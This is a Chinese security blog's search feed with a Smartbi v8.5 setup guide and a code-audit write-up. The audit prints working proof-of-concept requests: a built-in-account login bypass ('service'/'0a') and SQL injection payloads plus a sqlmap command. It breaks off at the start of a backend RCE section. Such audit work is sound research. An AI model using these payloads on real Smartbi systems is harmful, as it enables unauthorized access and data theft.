<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Smartbi v8.5 环境搭建</title>
    <link href="/2025/08/07/Smartbi%20v8.5%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/08/07/Smartbi%20v8.5%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Smartbi-v8-5-环境搭建"><a href="#Smartbi-v8-5-环境搭建" class="headerlink" title="Smartbi v8.5 环境搭建"></a>Smartbi v8.5 环境搭建</h1><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>通过网盘分享的文件：Smartbi Insight Edition-2018-11-22.zip<br>链接: <a href="https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ">https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ</a> 提取码: wan4 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207593.png" alt="20250730142614982"></p><p>用户名和公司名称随意</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207797.png" alt="20250730142606223"></p><p>更改安装目录</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207535.png" alt="20250730142705002"></p><p><strong>此处，不要选择“安装演示库”，否则会报“报表数量超过限制”的错误</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207934.png" alt="20250730142800593"></p><p>不选择“注册为Windows服务”，内存大小默认即可</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211381.png" alt="20250730142851342"></p><p>登录首页的密码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211551.png" alt="20250730142859437"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211744.png" alt="20250730142905276"></p><h2 id="二、license获取"><a href="#二、license获取" class="headerlink" title="二、license获取"></a>二、license获取</h2><p>官网地址：<a href="https://www.smartbi.com.cn/">https://www.smartbi.com.cn/</a></p><p>license申请地址：<a href="https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html">https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html</a></p><p>这里第一次进入需要注册\登录：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072211274.png" alt="20250730201318600"></p><p>之后便可以申请了，邮箱要填正确，之后会将 license 发到邮箱里</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072212883.png" alt="20250806200815728"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072213347.png" alt="image-20250807221345227"></p><p>选择个人版</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214816.png" alt="20250730201536174"></p><p>之后在邮箱里可以看到发的：Smartbi-License.xml</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214979.png" alt="20250730201709835"></p><h3 id="获取-licence-后，将其放置在-E-Smartbi-Tomcat-bin文件夹下"><a href="#获取-licence-后，将其放置在-E-Smartbi-Tomcat-bin文件夹下" class="headerlink" title="获取 licence 后，将其放置在 E:\Smartbi\Tomcat\bin文件夹下"></a>获取 licence 后，将其放置在 <code>E:\Smartbi\Tomcat\bin</code>文件夹下</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072214848.png" alt="20250730203434407"></p><h2 id="三、创建数据库"><a href="#三、创建数据库" class="headerlink" title="三、创建数据库"></a>三、创建数据库</h2><p>首先连接 <code>Smartbi</code> ：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215810.png" alt="20250730202151890"></p><p>创建<code>Smartbi</code> 数据库：</p><p><strong>第一步连接好之后，是没有 smartbi 数据库的，需要自己创建</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215211.png" alt="20250730202209089"></p><p>下面是 MySQL 的配置：</p><p><code>database-name</code> 在选择安装“演示数据库”时是：<code>smartbidemo</code>；咋们没有选择，所以默认是：<code>smartbi</code>。</p><p>E:\Smartbi\Tomcat\bin\smartbi-config.xml</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215236.png" alt="20250730202402962"></p><h2 id="四、解决浏览器版本误判"><a href="#四、解决浏览器版本误判" class="headerlink" title="四、解决浏览器版本误判"></a>四、解决浏览器版本误判</h2><p>这一步可以看下面问题中的 <code>1、</code></p><h2 id="五、启动程序"><a href="#五、启动程序" class="headerlink" title="五、启动程序"></a>五、启动程序</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>E:\Smartbi\Tomcat\bin\startup.cmd</p><p>运行 startup.cmd ，启动服务器</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>系统开始菜单中找到 Smartbi 的安装目录，单击启动Smartbi服务</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215033.png" alt="20250730203101194"></p><p>没有报错的话，就是启动成功了，</p><p><strong>若到这一步服务启动有错，重启电脑！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072215464.png" alt="20250730203306884"></p><h2 id="六、配置程序"><a href="#六、配置程序" class="headerlink" title="六、配置程序"></a>六、配置程序</h2><p>访问Smartbi:</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216056.png" alt="20250730203519660"></p><p>首次访问，需输入密码，这里的密码随意，我的是 <code>admin</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216206.png" alt="20250730203618192"></p><p>接下来的配置按照图中所示即可：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216156.png" alt="20250730204159549"></p><h2 id="七、进入主页"><a href="#七、进入主页" class="headerlink" title="七、进入主页"></a>七、进入主页</h2><p>重启服务后，再次点击<code>访问Smartbi</code>，会进入下方页面：</p><p><a href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a></p><p>首次访问登录页：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072216556.png" alt="20250730204745953"></p><p>此处的旧密码是<code>manager</code>，之后自行修改一个新密码：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217262.png" alt="20250730204612002"></p><p>这是之后访问登录页：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217160.png" alt="20250730204403222"></p><p>登录系统：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217230.png" alt="20250730204932051"></p><p>至此，Smartbi v8.5 环境搭建完成。</p><h1 id="搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）："><a href="#搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）：" class="headerlink" title="搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）："></a>搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）：</h1><h2 id="1、浏览器版本被错误检测"><a href="#1、浏览器版本被错误检测" class="headerlink" title="1、浏览器版本被错误检测"></a>1、浏览器版本被错误检测</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072217317.png" alt="20250730194311903"></p><p>参考：<a href="https://www.xiaoheiwoo.com/windows-11-internet-explorer/">https://www.xiaoheiwoo.com/windows-11-internet-explorer/</a></p><h3 id="方法一：从“管理加载项”窗口打开-Internet-Explorer"><a href="#方法一：从“管理加载项”窗口打开-Internet-Explorer" class="headerlink" title="方法一：从“管理加载项”窗口打开 Internet Explorer"></a>方法一：从“管理加载项”窗口打开 Internet Explorer</h3><p>用过 IE浏览器的人应该知道，IE中是可以通过 Internet属性 窗口，对浏览器进行功能设置的。</p><p>虽然 Win11默认找不到 IE的入口，但是 Internet属性 程序依然可以正常运行，我们可以点击其中的 管理加载项 功能，打开 IE 浏览器。</p><p>步骤是：</p><ol><li>首先，按 <code>Win + R</code> 打开运行窗口</li><li>接下来，在运行命令框中输入 <code>inetcpl.cpl</code></li><li>单击 <code>确定</code> 进入 Internet 属性窗口</li><li>选择 <code>程序</code> 选项卡，点击 <code>管理加载项</code> 按钮<ol><li>然后，点击窗口底部 <code>了解有关工具栏和扩展的详细信息</code></li><li>铛铛铛，你要的 IE浏览器出现啦~</li></ol></li></ol><h3 id="方法二：注释掉判断语句"><a href="#方法二：注释掉判断语句" class="headerlink" title="方法二：注释掉判断语句"></a>方法二：注释掉判断语句</h3><p>进入 E:\Smartbi\Tomcat\webapps\smartbi\vision</p><p>找到文件 config.jsp</p><p>将判断部分注释掉</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072219561.png" alt="20250729143004181"></p><h2 id="2、报表数量超过限制"><a href="#2、报表数量超过限制" class="headerlink" title="2、报表数量超过限制"></a>2、报表数量超过限制</h2><p>07-29 20:27:27 ERROR activate(smartbi.framework.Framework:85) - 报表数量超过限制<br>报表数量超过限制:ReportCount:452&gt;20</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072219949.png" alt="20250729211037212"></p><p><strong>这个问题是由于安装时选择了安装<code>演示数据库</code> ，不安装即可。</strong></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi v8.5 代码审计</title>
    <link href="/2025/08/07/Smartbi%20v8.5%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/08/07/Smartbi%20v8.5%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="Smartbi-v8-5-代码审计"><a href="#Smartbi-v8-5-代码审计" class="headerlink" title="Smartbi v8.5 代码审计"></a>Smartbi v8.5 代码审计</h1><h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">E:.<br>├─Infobright用于分析型数据存储<br>├─jdkJava 开发环境<br>├─MySQL数据库服务<br>├─SmartbiUnionServerSmartbi 的 Union Server 模块（Presto 引擎相关）<br>├─smartbixmlaSmartbi XMLA 接口模块，主要用于与外部如 Excel 的数据透视表通信<br>└─TomcatSmartbi 使用的 Web 应用服务器，部署了核心 web 模块和插件扩展<br>    ├─bin包含Tomcat的启动/关闭脚本、Smartbi 的配置文件、运行日志<br>    |<span class="hljs-string">   </span>|<span class="hljs-string">  exts-smartbi扩展模块</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  Index-smartbi搜索索引</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  mlogs-smartbi模块级别日志</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  SmartbiX-ExtractData 数据导出模块</span><br><span class="hljs-string">    </span>|<span class="hljs-string">   </span>|<span class="hljs-string">  smartbi_repoBackup仓库备份</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span><br><span class="hljs-string">    ├─conf配置文件所在</span><br><span class="hljs-string">   </span>|<span class="hljs-string">│  catalina.policy</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  catalina.properties</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  context.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  logging.properties</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  server.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  tomcat-users.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  web.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│</span><br><span class="hljs-string"></span>|<span class="hljs-string">└─Catalina</span><br><span class="hljs-string">    </span>|<span class="hljs-string">└─localhost</span><br><span class="hljs-string">    ├─lib包含Tomcat运行所需的JAR库文件</span><br><span class="hljs-string">    ├─logs</span><br><span class="hljs-string">    ├─temp</span><br><span class="hljs-string">    ├─webapps实际部署的Web应用程序</span><br><span class="hljs-string">    ├─work Tomcat 运行时自动生成的 JSP 编译缓存</span><br></code></pre></td></tr></table></figure><p>在找源码的过程中，看到该系统使用了 Servlet 框架，理解 Servlet 框架对后续的代码理解有帮助</p><blockquote><p>servlet</p><p><a href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p><p><a href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p><p><a href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p></blockquote><h1 id="历史漏洞："><a href="#历史漏洞：" class="headerlink" title="历史漏洞："></a>历史漏洞：</h1><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><blockquote><p>Smartbi 身份认证绕过漏洞</p><p><a href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p></blockquote><p>网上的 身份认证&#x2F;内置用户登陆 绕过的代码和v8.5版本的有一些区别，不过还是能跟踪到代码漏洞点</p><p>1、代码分析</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\filter\CheckIsLoggedFilter.class</p><p>首先找到 CheckIsLoggedFilter.class 文件的 needToCheck() 方法，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071648181.png" alt="20250801173411982"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">needToCheck</span><span class="hljs-params">(String className, String methodName)</span> &#123;<br>    <span class="hljs-comment">//判断 className 非空且不是 BIConfigService （ BIConfigService 是完全信任的服务类，不需要任何登录校验）</span><br>    <span class="hljs-keyword">if</span> (!StringUtil.isNullOrEmpty(className) &amp;&amp; !className.equals(<span class="hljs-string">&quot;BIConfigService&quot;</span>)) &#123;<br>        <span class="hljs-comment">//如果调用的是 UserService 中的方法，即 methodName 属于&#123;&quot;login&quot;, &quot;loginFor&quot;, &quot;clickLogin&quot;, &quot;loginFromDB&quot;, &quot;logout&quot;, &quot;isLogged&quot;, &quot;isLoginAs&quot;, &quot;checkVersion&quot;, &quot;hasLicense&quot;&#125;</span><br>        <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;UserService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;loginFor&quot;</span>, <span class="hljs-string">&quot;clickLogin&quot;</span>, <span class="hljs-string">&quot;loginFromDB&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, <span class="hljs-string">&quot;isLogged&quot;</span>, <span class="hljs-string">&quot;isLoginAs&quot;</span>, <span class="hljs-string">&quot;checkVersion&quot;</span>, <span class="hljs-string">&quot;hasLicense&quot;</span>&#125;)) &#123;<br>            <span class="hljs-comment">//则不需要登录验证</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>接下来找找 CheckIsLoggedFilter 是在哪里利用的？</p><p> 找到在web.xml中有我们需要的路由 <code>/vision/RMIServlet</code></p><blockquote><p>看到的文章中都是先知道了 RMIServlet 这个路由，然后找到 CheckIsLoggedFilter </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652623.png" alt="20250801175223846"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652566.png" alt="20250801174751116"></p><p>尝试访问 <a href="http://localhost:18080/smartbi/vision/RMIServlet">http://localhost:18080/smartbi/vision/RMIServlet</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071653701.png" alt="20250801174912101"></p><p>POC：</p><p>主要结构：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UserService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>loginFromDB<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;service&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>内置用户（service），口令为0a；public、system可能不存在。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657532.png" alt="20250806083335304"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657358.png" alt="20250801175555800"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658122.png" alt="20250801175813702"></p><p>使用hackbar也可以，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658447.png" alt="20250801180133641"></p><p>之后访问 <a href="http://localhost:18080/smartbi/vision/">http://localhost:18080/smartbi/vision/</a></p><p>发现已经进入后台</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658299.png" alt="20250801180228087"></p><h2 id="SQL注入（FileResource）"><a href="#SQL注入（FileResource）" class="headerlink" title="SQL注入（FileResource）"></a>SQL注入（FileResource）</h2><p>FileResource 是用于处理文件的 Servlet</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658975.png" alt="20250802132757662"></p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\fileresource\FileResourceServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658788.png" alt="20250802132840122"></p><p>分析代码：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658880.png" alt="20250802133545296"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//从请求中获取 resID</span><br>    resID = request.getParameter(<span class="hljs-string">&quot;resId&quot;</span>);<br>    <span class="hljs-comment">//初始化 headerType 为 inline，inline 表示浏览器尝试直接在页面中打开文件（比如 PDF、图片）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">headerType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inline&quot;</span>;<br>    <span class="hljs-comment">//判断操作类型 opType 是 &quot;OPEN&quot; 还是 &quot;DOWNLOAD&quot;</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;OPEN&quot;</span>.equals(opType)) &#123;<br>        actionType = OperationType.FILE_RESOURCE_OPEN;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        actionType = OperationType.FILE_RESOURCE_DOWNLOAD;<br>        headerType = <span class="hljs-string">&quot;attachment&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//使用 Connection 对象创建 Statement，用于执行 SQL </span><br>    <span class="hljs-type">Statement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> conn.createStatement();<br>    <span class="hljs-comment">//执行 SQL 查询，从 t_fileresource 表中查找指定 resID 的资源文件信息</span><br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stat.executeQuery(<span class="hljs-string">&quot;select c_content,c_name,c_alias,c_type from t_fileresource where c_id = &#x27;&quot;</span> + resID + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>没有对 resID 参数进行过滤直接使用 executeQuery() 拼接执行sql语句，造成sql注入</strong></p><p>构造payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/FileResource?resId=<span class="hljs-number">1</span>&amp;opType=DOWNLOAD<br></code></pre></td></tr></table></figure><p>可以sqlmap跑一下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://127.0.0.1:18080/smartbi/vision/FileResource?resId=1&amp;opType=DOWNLOAD&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658445.png" alt="20250802140622564"></p><h2 id="SQL注入（RMIServlet）"><a href="#SQL注入（RMIServlet）" class="headerlink" title="SQL注入（RMIServlet）"></a>SQL注入（RMIServlet）</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\repository\FileResourceDAO.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659185.png" alt="20250805165508359"></p><p>getFileResource方法接收参数 id ，直接拼接SQl语句查询 t_fileresource 表，没有对 id 进行过滤或者其他的安全措施，存在SQL注入风险</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659316.png" alt="20250805181321541"></p><p>getFileResource方法在URLLinkService中调用：</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\urllink\URLLinkService.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659108.png" alt="20250805181341517"></p><p><strong>漏洞复现：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-sqf">Content-<span class="hljs-built_in">Type</span>: application/x-www-form-urlencoded</span><br><span class="language-sqf"></span><br><span class="language-sqf"><span class="hljs-built_in">className</span>=UrlLinkService&amp;methodName=getFileResource&amp;<span class="hljs-built_in">params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=7DDE39A449342C004D2F35ABF13BB5AB<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>99<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UrlLinkService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>getFileResource<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659622.png" alt="20250805182305339"></p><h2 id="后台rce"><a href="#后台rce" class="headerlink" title="后台rce"></a>后台rce</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659333.png" alt="20250802145216052"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 